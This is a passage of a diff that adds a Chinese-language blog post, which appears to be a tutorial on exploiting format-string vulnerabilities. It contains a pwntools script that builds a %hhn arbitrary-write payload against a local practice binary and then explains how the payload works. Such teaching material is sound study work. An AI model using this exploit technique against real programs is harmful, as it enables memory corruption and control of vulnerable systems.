class="number">0xff</span>, <span class="built_in">offset</span> + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">    return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804A028</span>,<span class="number">0x12345678</span>)</span><br><span class="line"><span class="comment">#第一个参数是覆盖的地址最初的偏移</span></span><br><span class="line"><span class="comment">#第二个参数是机器字长（4/8）</span></span><br><span class="line"><span class="comment">#第三个参数是将要覆盖的地址</span></span><br><span class="line"><span class="comment">#第四个参数是要覆盖为目的变量值</span></span><br></pre></td></tr></table></figure>
+
+<p>最终的exploit：</p>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from libformatstr <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">"./test"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./test"</span>)</span><br><span class="line">c_addr = eval(p.recv())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c_addr)</span><br><span class="line">#gdb.attach(p,<span class="string">"b *0x8048568"</span>)</span><br><span class="line">def fmt(prev, word, index):</span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + <span class="built_in">str</span>(result) + <span class="string">"c"</span></span><br><span class="line">    elif prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + <span class="built_in">str</span>(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + <span class="built_in">str</span>(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt_str(offset, <span class="built_in">size</span>, addr, target):</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">size</span> == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,c_addr,<span class="number">0x12345678</span>)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(u32(payload[<span class="number">0</span>:<span class="number">4</span>])))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(u32(payload[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(u32(payload[<span class="number">8</span>:<span class="number">12</span>])))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(u32(payload[<span class="number">12</span>:<span class="number">16</span>])))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(<span class="number">104</span>+<span class="number">16</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(<span class="number">104</span>+<span class="number">16</span>+<span class="number">222</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(<span class="number">104</span>+<span class="number">16</span>+<span class="number">222</span>+<span class="number">222</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="built_in">hex</span>(<span class="number">104</span>+<span class="number">16</span>+<span class="number">222</span>+<span class="number">222</span>+<span class="number">222</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+
+<p>结果：<br><img src="https://s2.ax1x.com/2019/02/28/kHFwY8.png" alt></p>
+<p>我通过把自动生成的payload分解并进行了分析：4个地址开头，占16个字节，“%104c”是将长度扩充到0x78，“%6$hhn”是覆盖第一个地址，以一个字节进行写入，“%222c”是将长度扩充到0x156，“%7$hhn”是覆盖第二个地址，以一个字节进行写入，写入的是0x56，最高位被舍去了，后面两个也是同样的道理。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
